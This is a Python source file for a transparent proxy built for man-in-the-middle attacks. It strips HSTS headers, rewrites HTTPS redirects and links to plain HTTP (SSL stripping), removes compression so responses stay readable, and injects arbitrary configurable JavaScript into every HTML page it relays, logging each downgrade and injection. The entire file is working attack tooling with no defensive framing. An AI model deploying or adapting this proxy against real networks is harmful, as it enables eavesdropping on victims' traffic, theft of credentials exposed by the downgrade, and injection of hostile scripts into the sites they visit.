import socket
import threading
import select
import re

class TransparentProxy:
    def __init__(self, listen_port=8080, injection_code="alert('Injected!');", log_callback=None):
        self.listen_port = listen_port
        self.injection_code = f"<script>{injection_code}</script></body>"
        self.log_callback = log_callback
        self.server_socket = None
        self.is_running = False
        self.stop_event = threading.Event()

    def set_injection_code(self, code):
        self.injection_code = f"<script>{code}</script></body>"

    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(('', self.listen_port))
        self.server_socket.listen(100)
        self.is_running = True
        self.stop_event.clear()
        print(f"[*] Proxy listening on port {self.listen_port}")
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def stop(self):
        print("[*] Stopping Proxy...")
        self.is_running = False
        self.stop_event.set()
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass

    def _accept_loop(self):
        while not self.stop_event.is_set():
            try:
                client_sock, addr = self.server_socket.accept()
                threading.Thread(target=self._handle_client, args=(client_sock,), daemon=True).start()
            except:
                break

    def _handle_client(self, client_sock):
        remote_sock = None
        try:
            request = client_sock.recv(16384)
            if not request:
                client_sock.close()
                return

            # --- 1. Modify Client Request ---
            # Extract Host
            host = self._extract_host(request)
            if not host:
                client_sock.close()
                return

            if self.log_callback:
                 self.log_callback("PROXY", f"Intercepted HTTP request to {host}")

            # Downgrade to HTTP/1.0 (Forces NO Chunked Encoding from server)
            request = re.sub(rb'HTTP/1\.1', b'HTTP/1.0', request)

            # Downgrade: Strip 'Accept-Encoding' (Force Plaintext)
            request = re.sub(rb'(?i)Accept-Encoding:.*?\r\n', b'', request)
            # Downgrade: Strip 'Upgrade-Insecure-Requests'
            request = re.sub(rb'(?i)Upgrade-Insecure-Requests:.*?\r\n', b'', request)
            # FORCE CLOSE: Prevent Keep-Alive hangs
            request = re.sub(rb'(?i)Connection:.*?\r\n', b'Connection: close\r\n', request)
            if b'Connection: close' not in request: 
                 # If header wasn't there to replace, add it (simple heuristic, might be messy if not careful, 
                 # but usually it IS there. If not, append to end of headers?)
                 # Safer: just replace if exists. Most modern browsers send it or keep-alive.
                 pass

            # --- 2. Connect to Server ---
            # Try HTTP first (Port 80)
            remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_sock.settimeout(10) # Prevent infinite connect wait
            try:
                remote_sock.connect((host, 80))
            except:
                client_sock.close()
                return

            remote_sock.sendall(request)

            # --- 3. Pipe & Modify Response ---
            while True:
                readable, _, _ = select.select([remote_sock], [], [], 5)
                if not readable:
                    break # Timeout
                
                # Receive from Server
                try:
                    data = remote_sock.recv(65535)
                except:
                    break
                    
                if not data:
                    break

                # --- 4. Modify Response (SSL Strip + Injection) ---
                
                # --- 4. Modify Response (SSL Strip + Injection) ---
                
                stripped = False
                injected = False
                
                # A. HEADER STRIPPING (Apply to ALL responses)
                # 1. Strip HSTS (Strict-Transport-Security)
                if re.search(rb'(?i)Strict-Transport-Security:', data):
                    data = re.sub(rb'(?i)Strict-Transport-Security:.*?\r\n', b'', data)
                    stripped = True

                # 2. Downgrade Redirects (Location: https:// -> http://)
                if re.search(rb'(?i)Location:\s*https://', data):
                    data = re.sub(rb'(?i)Location:\s*https://', b'Location: http://', data)
                    stripped = True

                # B. BODY MODIFICATION (Only Text/HTML)
                # Ensure case-insensitive check for Content-Type
                is_html = re.search(rb'(?i)Content-Type:\s*text/html', data)
                
                if is_html:
                    # 3. SSL Strip in Body (Links, Images, Scripts)
                    if b'https://' in data:
                        data = data.replace(b'https://', b'http://')
                        stripped = True
                    
                    # 4. Code Injection
                    if b"</body>" in data:
                        code_bytes = self.injection_code.encode()
                        data = data.replace(b"</body>", code_bytes)
                        injected = True
                        
                    # 5. Strip Content-Length & FORCE CLOSE
                    data = re.sub(rb'(?i)Content-Length:.*?\r\n', b'', data)
                    data = re.sub(rb'(?i)Connection:.*?\r\n', b'Connection: close\r\n', data)

                elif stripped:
                     # Even if not HTML, if we stripped headers, we might need to fix content length or close connection
                     # to be safe, let's force close if we modified headers significantly affecting length 
                     # (removing HSTS shrinks it, modifying Location shrinks/grows it slightly)
                     # Safest is to strip content-length if present, or just leave it if length didn't change (HSTS removal changes length!)
                     
                     # Check if Content-Length exists
                     if re.search(rb'(?i)Content-Length:', data):
                         data = re.sub(rb'(?i)Content-Length:.*?\r\n', b'', data)
                         data = re.sub(rb'(?i)Connection:.*?\r\n', b'Connection: close\r\n', data)


                # LOGGING
                if self.log_callback:
                    if stripped:
                         self.log_callback("SSL_STRIP", f"Downgraded HTTPS links/headers for {host}")
                    if injected:
                         self.log_callback("INJECTION", f"Injected JS Code into {host}")

                client_sock.sendall(data)
                
        except Exception as e:
            pass
        finally:
            if client_sock: client_sock.close()
            if remote_sock: remote_sock.close()

    def _extract_host(self, request):
        try:
            # Simple regex to find Host header
            m = re.search(rb'(?i)Host:\s*([^\r\n]+)', request)
            if m:
                return m.group(1).decode().strip()
        except:
            return None
        return None
